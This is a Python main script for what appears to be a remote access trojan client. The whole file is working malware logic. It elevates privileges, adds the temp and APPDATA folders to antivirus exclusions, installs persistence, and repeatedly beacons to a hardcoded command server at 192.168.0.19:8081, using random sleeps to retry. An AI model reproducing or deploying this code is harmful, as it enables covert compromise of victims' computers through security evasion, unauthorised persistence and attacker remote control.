from core.connection import conn
from core.connection.handler import connection_handler
from core.utils import display_msg, elevate_script, test_for_startup_app, generate_random_int
from core.features.antivirus import exclude_path_antivirus
from core.features.persistence import __persistant
import tempfile
import os
import sys
import time
import random
import core.conf as conf


def __initialization__():
    elevate_script()
    test_for_startup_app()
    time.sleep(generate_random_int())
    if not sys.executable == conf.APPDATA_EXE:
        exclude_path_antivirus(tempfile.gettempdir())
        generate_random_int()
        exclude_path_antivirus(os.getenv('APPDATA'))
        __persistant()





if __name__ == "__main__":
    __initialization__()
    while True:
        try:
            display_msg("Trying to connect ", "y")
            client = conn.Client("192.168.0.19", 8081)
            client.connect_with_server()
            connection_handler(client)
            client.close()
        except KeyboardInterrupt:
            display_msg("Keyboard Interrupt, Exiting", "r")
            sys.exit(0)
        except Exception as err:
            display_msg("Unable to establish connection " + str(err), "r")
            dur = random.randint(conf.__start_time, conf.__end_time)
            display_msg("Going to sleep for "+ str(dur) + " seconds")
            time.sleep(dur)

